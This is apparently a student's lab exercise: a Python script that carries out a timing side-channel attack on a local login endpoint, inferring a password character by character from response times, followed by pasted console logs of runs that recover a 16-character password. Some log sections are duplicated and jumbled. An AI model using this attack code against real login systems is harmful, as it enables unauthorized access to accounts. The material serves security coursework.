import requests
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


def crack_password(url, user_name, password_length, optional_chars, difficulty, samples=4):

    current_password = ""
    start_time = time.time()
    for length in range(1, password_length + 1):
        times_per_char = {}
        print(f"Testing position {length}..., elapsed time: {time.time() - start_time:.2f}s")
        for char in optional_chars:
            test_password = current_password + char + "a" * (password_length - length)
            test_url = f"http://127.0.0.1/?user={user_name}&password={test_password}&difficulty={difficulty}"
            for _ in range(samples):
                response = requests.get(test_url)
                times_per_char[char] = times_per_char.get(char, 0) + response.elapsed.total_seconds()
        avg_times_per_char = {char: total_time / samples for char, total_time in times_per_char.items()}
        sorted_chars = sorted(avg_times_per_char, key=avg_times_per_char.get, reverse=True)
        best_char = sorted_chars[0]
        current_password += best_char
        print(f"Top 5 candidates for position {length}:")
        for candidate in sorted_chars[:5]:
            print(f"  Char: {candidate}, Avg Time: {avg_times_per_char[candidate]:.6f} seconds, diff from best: {avg_times_per_char[candidate] - avg_times_per_char[best_char]:.6f} seconds")
        print(f"Detected character at position {length}: {best_char}, current password: {current_password}")

    return current_password


def find_password_length(url, user_name, difficulty, samples=4):
    times_per_length = {}
    for length in range(1, 33):
        test_password = "a" * length
        test_url = f"http://127.0.0.1/?user={user_name}&password={test_password}&difficulty={difficulty}"
        for _ in range(samples):
            response = requests.get(test_url)
            times_per_length[length] = times_per_length.get(length, 0) + response.elapsed.total_seconds()

    avg_times_per_length = {length: total_time / samples for length, total_time in times_per_length.items()}
    print("Average response times per password length:")

    for length, avg_time in avg_times_per_length.items():
        print(f"Length {length}: {avg_time:.6f} seconds")

    passward_length = sorted(avg_times_per_length, key=avg_times_per_length.get)[-1]
    print(f"Detected password length: {passward_length}")


    return passward_length



def main():
    optional_chars = "abcdefghijklmnopqrstuvwxyz"
    max_length = 32
    user_name = "316279942"
    difficulty = 1
    password = "oafotaotttaoftat"
    url = f"http://127.0.0.1/?user={user_name}&password={password}&difficulty={difficulty}"

    print("Try user name test: " + url)
    response = requests.get(url)
    print(response.text)
    print(f"Time: {response.elapsed.total_seconds():.6f} seconds")

    # print("Finding password length...")
    # password_length = find_password_length("http://127.0.0.1/", user_name, difficulty)


    password_length = 16
    print("current time stamp: ", time.time()  )
    print(f"Starting timing attack to find password...")
    crack_password_old = crack_password("http://127.0.0.1/", user_name, password_length, optional_chars, difficulty, samples=5)
    print(f"Cracked password: {crack_password_old}")

    # Using optimized version (4 parallel threads, 5 samples per char)
    # cracked_password = crack_password_optimized("http://127.0.0.1/", user_name, password_length, optional_chars, difficulty, samples=5, threads=4)
    # print(f"Cracked password: {cracked_password}")

if __name__ == "__main__":
    main()

#boovghcfslcnp [14]
'''
Testing position 10..., elapsed time: 1783.08s
Top 5 candidates for position 10:
  Char: l, Avg Time: 3.014079 seconds, diff from best: 0.000000 seconds
  Char: m, Avg Time: 2.766531 seconds, diff from best: -0.247548 seconds
  Char: c, Avg Time: 2.766158 seconds, diff from best: -0.247921 seconds
  Char: r, Avg Time: 2.764651 seconds, diff from best: -0.249429 seconds
  Char: s, Avg Time: 2.764227 seconds, diff from best: -0.249852 seconds
Detected character at position 10: l, current password: boovghcfsl
Testing position 11..., elapsed time: 2143.64s
Top 5 candidates for position 11:
  Char: c, Avg Time: 3.511942 seconds, diff from best: 0.000000 seconds
  Char: r, Avg Time: 3.016430 seconds, diff from best: -0.495512 seconds
  Char: k, Avg Time: 3.014753 seconds, diff from best: -0.497189 seconds
  Char: j, Avg Time: 3.014528 seconds, diff from best: -0.497414 seconds
  Char: l, Avg Time: 3.014391 seconds, diff from best: -0.497551 seconds
Detected character at position 11: c, current password: boovghcfslc
Testing position 12..., elapsed time: 2538.01s
Top 5 candidates for position 12:
  Char: n, Avg Time: 3996.125808 seconds, diff from best: 0.000000 seconds
  Char: a, Avg Time: 3.510898 seconds, diff from best: -3992.614910 seconds
  Char: f, Avg Time: 3.264955 seconds, diff from best: -3992.860853 seconds
  Char: j, Avg Time: 3.264182 seconds, diff from best: -3992.861626 seconds
  Char: h, Avg Time: 3.263988 seconds, diff from best: -3992.861820 seconds
Detected character at position 12: n, current password: boovghcfslcn
Testing position 13..., elapsed time: 22924.80s
Top 5 candidates for position 13:
  Char: p, Avg Time: 3.264813 seconds, diff from best: 0.000000 seconds
  Char: w, Avg Time: 3.263906 seconds, diff from best: -0.000907 seconds
  Char: q, Avg Time: 3.263494 seconds, diff from best: -0.001319 seconds
  Char: n, Avg Time: 3.263039 seconds, diff from best: -0.001775 seconds
  Char: l, Avg Time: 3.262984 seconds, diff from best: -0.001830 seconds
Detected character at position 13: p, current password: boovghcfslcnp
Testing position 14..., elapsed time: 23348.81s
Traceback (most recent call last):
  File "C:\Users\dorfe\OneDrive\Desktop\Projects_20
'''



#boovghcfslcajg
'''
PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1>
PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1>
PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1> python3 .\attack.py
Try user name test: http://127.0.0.1/?user=316279942&password=oafotaotttaoftat&difficulty=1
0
Time: 0.511763 seconds
Starting timing attack to find password...
Testing position 1..., elapsed time: 0.00s
Top 5 candidates for position 1:
  Char: b, Avg Time: 0.765377 seconds, diff from best: 0.000000 seconds
  Char: u, Avg Time: 0.514652 seconds, diff from best: -0.250725 seconds
  Char: q, Avg Time: 0.514567 seconds, diff from best: -0.250810 seconds
  Char: f, Avg Time: 0.514435 seconds, diff from best: -0.250941 seconds
  Char: x, Avg Time: 0.514090 seconds, diff from best: -0.251287 seconds
Detected character at position 1: b, current password: b
Testing position 2..., elapsed time: 68.08s
Top 5 candidates for position 2:
  Char: o, Avg Time: 1.014756 seconds, diff from best: 0.000000 seconds
  Char: e, Avg Time: 0.766848 seconds, diff from best: -0.247908 seconds
  Char: l, Avg Time: 0.766549 seconds, diff from best: -0.248207 seconds
  Char: u, Avg Time: 0.766157 seconds, diff from best: -0.248600 seconds
  Char: j, Avg Time: 0.765394 seconds, diff from best: -0.249362 seconds
Detected character at position 2: o, current password: bo
Testing position 3..., elapsed time: 168.77s
Top 5 candidates for position 3:
  Char: o, Avg Time: 1.263997 seconds, diff from best: 0.000000 seconds
  Char: e, Avg Time: 1.015438 seconds, diff from best: -0.248559 seconds
  Char: q, Avg Time: 1.015064 seconds, diff from best: -0.248933 seconds
  Char: m, Avg Time: 1.015034 seconds, diff from best: -0.248962 seconds
  Char: p, Avg Time: 1.014904 seconds, diff from best: -0.249093 seconds
Detected character at position 3: o, current password: boo
Testing position 4..., elapsed time: 301.89s
Top 5 candidates for position 4:
  Char: v, Avg Time: 1.511920 seconds, diff from best: 0.000000 seconds
  Char: e, Avg Time: 1.266031 seconds, diff from best: -0.245889 seconds
  Char: x, Avg Time: 1.265988 seconds, diff from best: -0.245932 seconds
  Char: b, Avg Time: 1.265632 seconds, diff from best: -0.246289 seconds
  Char: d, Avg Time: 1.263628 seconds, diff from best: -0.248293 seconds
Detected character at position 4: v, current password: boov
Testing position 5..., elapsed time: 467.41s
Top 5 candidates for position 5:
  Char: g, Avg Time: 1.761675 seconds, diff from best: 0.000000 seconds
  Char: c, Avg Time: 1.519104 seconds, diff from best: -0.242571 seconds
  Char: t, Avg Time: 1.516141 seconds, diff from best: -0.245533 seconds
  Char: b, Avg Time: 1.514456 seconds, diff from best: -0.247219 seconds
  Char: l, Avg Time: 1.513834 seconds, diff from best: -0.247841 seconds
Detected character at position 5: g, current password: boovg
Testing position 6..., elapsed time: 665.51s
Top 5 candidates for position 6:
  Char: h, Avg Time: 2.017041 seconds, diff from best: 0.000000 seconds
  Char: t, Avg Time: 1.767773 seconds, diff from best: -0.249268 seconds
  Char: d, Avg Time: 1.765597 seconds, diff from best: -0.251444 seconds
  Char: o, Avg Time: 1.765429 seconds, diff from best: -0.251612 seconds
  Char: g, Avg Time: 1.764416 seconds, diff from best: -0.252625 seconds
Detected character at position 6: h, current password: boovgh
Testing position 7..., elapsed time: 896.15s
Top 5 candidates for position 7:
  Char: c, Avg Time: 2.264025 seconds, diff from best: 0.000000 seconds
  Char: b, Avg Time: 2.016434 seconds, diff from best: -0.247592 seconds
  Char: e, Avg Time: 2.015536 seconds, diff from best: -0.248489 seconds
  Char: i, Avg Time: 2.015075 seconds, diff from best: -0.248951 seconds
  Char: u, Avg Time: 2.014460 seconds, diff from best: -0.249565 seconds
Detected character at position 7: c, current password: boovghc
Testing position 8..., elapsed time: 1159.28s
Top 5 candidates for position 8:
  Char: f, Avg Time: 2.511039 seconds, diff from best: 0.000000 seconds
  Char: l, Avg Time: 2.266312 seconds, diff from best: -0.244727 seconds
  Char: t, Avg Time: 2.265786 seconds, diff from best: -0.245252 seconds
  Char: n, Avg Time: 2.265404 seconds, diff from best: -0.245635 seconds
  Char: s, Avg Time: 2.265108 seconds, diff from best: -0.245931 seconds
Detected character at position 8: f, current password: boovghcf
Testing position 9..., elapsed time: 1454.94s
Top 5 candidates for position 9:
  Char: s, Avg Time: 2.765058 seconds, diff from best: 0.000000 seconds
  Char: k, Avg Time: 2.514891 seconds, diff from best: -0.250167 seconds
  Char: i, Avg Time: 2.514363 seconds, diff from best: -0.250695 seconds
  Char: t, Avg Time: 2.513794 seconds, diff from best: -0.251264 seconds
  Char: z, Avg Time: 2.513718 seconds, diff from best: -0.251340 seconds
Detected character at position 9: s, current password: boovghcfs
Testing position 10..., elapsed time: 1783.08s
Top 5 candidates for position 10:
  Char: l, Avg Time: 3.014079 seconds, diff from best: 0.000000 seconds
  Char: m, Avg Time: 2.766531 seconds, diff from best: -0.247548 seconds
  Char: c, Avg Time: 2.766158 seconds, diff from best: -0.247921 seconds
  Char: r, Avg Time: 2.764651 seconds, diff from best: -0.249429 seconds
  Char: s, Avg Time: 2.764227 seconds, diff from best: -0.249852 seconds
Detected character at position 10: l, current password: boovghcfsl
Testing position 11..., elapsed time: 2143.64s
Top 5 candidates for position 11:
  Char: c, Avg Time: 3.511942 seconds, diff from best: 0.000000 seconds
  Char: r, Avg Time: 3.016430 seconds, diff from best: -0.495512 seconds
  Char: k, Avg Time: 3.014753 seconds, diff from best: -0.497189 seconds
  Char: j, Avg Time: 3.014528 seconds, diff from best: -0.497414 seconds
  Char: l, Avg Time: 3.014391 seconds, diff from best: -0.497551 seconds
Detected character at position 11: c, current password: boovghcfslc
Testing position 12..., elapsed time: 2538.01s
Top 5 candidates for position 12:
  Char: n, Avg Time: 3996.125808 seconds, diff from best: 0.000000 seconds
  Char: a, Avg Time: 3.510898 seconds, diff from best: -3992.614910 seconds
  Char: f, Avg Time: 3.264955 seconds, diff from best: -3992.860853 seconds
  Char: j, Avg Time: 3.264182 seconds, diff from best: -3992.861626 seconds
  Char: h, Avg Time: 3.263988 seconds, diff from best: -3992.861820 seconds
Detected character at position 12: n, current password: boovghcfslcn
Testing position 13..., elapsed time: 22924.80s
Top 5 candidates for position 13:
  Char: p, Avg Time: 3.264813 seconds, diff from best: 0.000000 seconds
  Char: w, Avg Time: 3.263906 seconds, diff from best: -0.000907 seconds
  Char: q, Avg Time: 3.263494 seconds, diff from best: -0.001319 seconds
  Char: n, Avg Time: 3.263039 seconds, diff from best: -0.001775 seconds
  Char: l, Avg Time: 3.262984 seconds, diff from best: -0.001830 seconds
Detected character at position 13: p, current password: boovghcfslcnp
Testing position 14..., elapsed time: 23348.81s
Traceback (most recent call last):
'''



'''
PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1> python3 .\attack.py
Try user name test: http://127.0.0.1/?user=316279942&password=oafotaotttaoftat&difficulty=1
0
Time: 0.510399 seconds
current time stamp:  1762840496.1116333
Starting timing attack to find password resume from: boovghcfslc
Testing position 12..., elapsed time: 0.00s
Time: 0.510399 seconds
current time stamp:  1762840496.1116333
Starting timing attack to find password resume from: boovghcfslc
Testing position 12..., elapsed time: 0.00s
current time stamp:  1762840496.1116333
Starting timing attack to find password resume from: boovghcfslc
Testing position 12..., elapsed time: 0.00s
Top 5 candidates for position 12:
  Char: a, Avg Time: 3.511479 seconds, diff from best: 0.000000 seconds
Starting timing attack to find password resume from: boovghcfslc
Testing position 12..., elapsed time: 0.00s
Top 5 candidates for position 12:
  Char: a, Avg Time: 3.511479 seconds, diff from best: 0.000000 seconds
Testing position 12..., elapsed time: 0.00s
Top 5 candidates for position 12:
  Char: a, Avg Time: 3.511479 seconds, diff from best: 0.000000 seconds
Top 5 candidates for position 12:
  Char: a, Avg Time: 3.511479 seconds, diff from best: 0.000000 seconds
  Char: i, Avg Time: 3.264877 seconds, diff from best: -0.246602 seconds
  Char: d, Avg Time: 3.264518 seconds, diff from best: -0.246961 seconds
  Char: z, Avg Time: 3.263681 seconds, diff from best: -0.247798 seconds
  Char: q, Avg Time: 3.262656 seconds, diff from best: -0.248824 seconds
  Char: z, Avg Time: 3.263681 seconds, diff from best: -0.247798 seconds
  Char: q, Avg Time: 3.262656 seconds, diff from best: -0.248824 seconds
Detected character at position 12: a, current password: boovghcfslca
Testing position 13..., elapsed time: 425.27s
  Char: q, Avg Time: 3.262656 seconds, diff from best: -0.248824 seconds
Detected character at position 12: a, current password: boovghcfslca
Testing position 13..., elapsed time: 425.27s
Top 5 candidates for position 13:
Detected character at position 12: a, current password: boovghcfslca
Testing position 13..., elapsed time: 425.27s
Top 5 candidates for position 13:
Testing position 13..., elapsed time: 425.27s
Top 5 candidates for position 13:
Top 5 candidates for position 13:
  Char: j, Avg Time: 3.762148 seconds, diff from best: 0.000000 seconds
  Char: g, Avg Time: 3.513883 seconds, diff from best: -0.248265 seconds
  Char: w, Avg Time: 3.511870 seconds, diff from best: -0.250278 seconds
  Char: w, Avg Time: 3.511870 seconds, diff from best: -0.250278 seconds
  Char: a, Avg Time: 3.511619 seconds, diff from best: -0.250529 seconds
  Char: i, Avg Time: 3.511466 seconds, diff from best: -0.250681 seconds
Detected character at position 13: j, current password: boovghcfslcaj
Testing position 14..., elapsed time: 882.93s
Top 5 candidates for position 14:
  Char: g, Avg Time: 4.006760 seconds, diff from best: 0.000000 seconds
  Char: u, Avg Time: 3.763990 seconds, diff from best: -0.242770 seconds
  Char: a, Avg Time: 3.511619 seconds, diff from best: -0.250529 seconds
  Char: i, Avg Time: 3.511466 seconds, diff from best: -0.250681 seconds
Detected character at position 13: j, current password: boovghcfslcaj
Testing position 14..., elapsed time: 882.93s
Top 5 candidates for position 14:
  Char: a, Avg Time: 3.511619 seconds, diff from best: -0.250529 seconds
  Char: i, Avg Time: 3.511466 seconds, diff from best: -0.250681 seconds
Detected character at position 13: j, current password: boovghcfslcaj
  Char: a, Avg Time: 3.511619 seconds, diff from best: -0.250529 seconds
  Char: a, Avg Time: 3.511619 seconds, diff from best: -0.250529 seconds
  Char: i, Avg Time: 3.511466 seconds, diff from best: -0.250681 seconds
Detected character at position 13: j, current password: boovghcfslcaj
Testing position 14..., elapsed time: 882.93s
Top 5 candidates for position 14:
  Char: g, Avg Time: 4.006760 seconds, diff from best: 0.000000 seconds
  Char: u, Avg Time: 3.763990 seconds, diff from best: -0.242770 seconds
  Char: s, Avg Time: 3.763978 seconds, diff from best: -0.242782 seconds
  Char: t, Avg Time: 3.762986 seconds, diff from best: -0.243774 seconds
  Char: k, Avg Time: 3.762917 seconds, diff from best: -0.243843 seconds
Detected character at position 14: g, current password: boovghcfslcajg
Testing position 15..., elapsed time: 1373.08s
Top 5 candidates for position 15:
  Char: f, Avg Time: 4.262300 seconds, diff from best: 0.000000 seconds
  Char: g, Avg Time: 4.014956 seconds, diff from best: -0.247345 seconds
  Char: c, Avg Time: 4.014251 seconds, diff from best: -0.248049 seconds
  Char: n, Avg Time: 4.014021 seconds, diff from best: -0.248279 seconds
  Char: e, Avg Time: 4.012314 seconds, diff from best: -0.249986 seconds
Detected character at position 15: f, current password: boovghcfslcajgf
Testing position 16..., elapsed time: 1895.69s
Top 5 candidates for position 16:
  Char: h, Avg Time: 4.261642 seconds, diff from best: 0.000000 seconds
  Char: r, Avg Time: 4.261551 seconds, diff from best: -0.000091 seconds
  Char: a, Avg Time: 4.261395 seconds, diff from best: -0.000247 seconds
  Char: g, Avg Time: 4.261239 seconds, diff from best: -0.000403 seconds
  Char: o, Avg Time: 4.260914 seconds, diff from best: -0.000727 seconds
Detected character at position 16: h, current password: boovghcfslcajgfh
Cracked password: boovghcfslcajgfh
Starting timing attack to find password...
'''